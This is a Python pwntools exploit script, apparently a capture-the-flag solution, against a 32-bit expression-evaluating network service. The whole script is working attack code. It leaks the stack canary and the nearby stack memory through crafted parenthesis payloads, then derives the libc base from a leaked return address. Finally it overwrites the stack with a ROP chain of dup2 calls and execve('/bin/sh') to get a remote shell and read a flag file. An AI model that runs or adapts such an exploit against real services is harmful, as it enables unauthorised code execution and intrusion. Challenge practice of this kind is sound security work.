from pwn import *

BUF_SIZE = 32
LOOPS_AFTER_CANARY = 26

INIT_BACK = ')))'

def sum_of_list_mod__2_32(list_to_sum):
        output = 0

        for el in list_to_sum:
                output += el

        return output % 2**32

def hard_solver(conn, DEBUG=False, NON_INTERACTIVE=False):
        p = conn

        # get canary
        canary_load = '(' * BUF_SIZE + ')' * (BUF_SIZE - 1)
        p.sendline(canary_load)
        raw_canary = int(p.recvline())
        canary = raw_canary & 0xFFFFFFFF

        # check & show canary
        if DEBUG:
                print("CANARY CHECK: %d" % canary)

        memory_after_buffer = list()
        memory_after_buffer.append(canary)

        # get more memory after canary
        for i in range(1, LOOPS_AFTER_CANARY):
                if DEBUG:
                        print("(FETCHER) LOOP COUNTER %d" % i)

                current_load = '(' * (BUF_SIZE + i) + INIT_BACK

                for mem_chunk in reversed(memory_after_buffer):
                        current_load += '+' + str(mem_chunk) + ')'

                current_load += ')' * (BUF_SIZE + i - 1 - len(INIT_BACK) - len(memory_after_buffer))
                if DEBUG:
                        print('(FETCHER) LOAD: ' + current_load)

                p.sendline(current_load)

                next_value = (int(p.recvline()) % 2**32 - sum_of_list_mod__2_32(memory_after_buffer)) % 2**32
                memory_after_buffer.append(next_value)

                if DEBUG:
                        print('(FETCHER) ACQUIRED: %d' % (next_value))

        offset = 243
        gadget_offset = 0xA6FA7
        libc_elf = ELF('libc-2.19.so')

        libc_start_offset = libc_elf.symbols['__libc_start_main']
        libc_base = (memory_after_buffer[20] - offset - libc_start_offset) % 2**32

        if DEBUG:
                print("LIBC BASE: " + hex(libc_base))

        execve_offset = libc_elf.symbols['execve']
        execve_address = libc_base + execve_offset
        dup2_offset = libc_elf.symbols['dup2']
        dup2_address = libc_base + dup2_offset
        binsh_offset = list(libc_elf.search('/bin/sh'))[0]
        binsh_address = libc_base + binsh_offset
        triple_pop_ret_gadget_address = libc_base + gadget_offset

        memory_after_buffer[4] = dup2_address
        memory_after_buffer[5] = triple_pop_ret_gadget_address
        memory_after_buffer[6] = 4
        memory_after_buffer[7] = 0
        memory_after_buffer[8] = 0
        memory_after_buffer[9] = dup2_address
        memory_after_buffer[10] = triple_pop_ret_gadget_address
        memory_after_buffer[11] = 4
        memory_after_buffer[12] = 1
        memory_after_buffer[13] = 0
        memory_after_buffer[14] = dup2_address
        memory_after_buffer[15] = triple_pop_ret_gadget_address
        memory_after_buffer[16] = 4
        memory_after_buffer[17] = 2
        memory_after_buffer[18] = 0
        memory_after_buffer[19] = execve_address
        memory_after_buffer[20] = 0
        memory_after_buffer[21] = binsh_address
        memory_after_buffer[22] = 0
        memory_after_buffer[23] = 0

        final_load = '(' * (BUF_SIZE + LOOPS_AFTER_CANARY) + INIT_BACK

        for mem_chunk in reversed(memory_after_buffer):
                final_load += '+' + str(mem_chunk) + ')'

        final_load += ')' * (BUF_SIZE + LOOPS_AFTER_CANARY - 1 - len(INIT_BACK) - len(memory_after_buffer))

        if DEBUG:
                print("FINAL LOAD: " + final_load)

        p.sendline(final_load)

        if NON_INTERACTIVE:
		p.sendline('cat flag.txt')
		p.recvline()
		print(p.recvline())
	else:
		p.interactive()


hard_solver(connect('h4x.0x04.net', 31337), DEBUG=True, NON_INTERACTIVE=True)
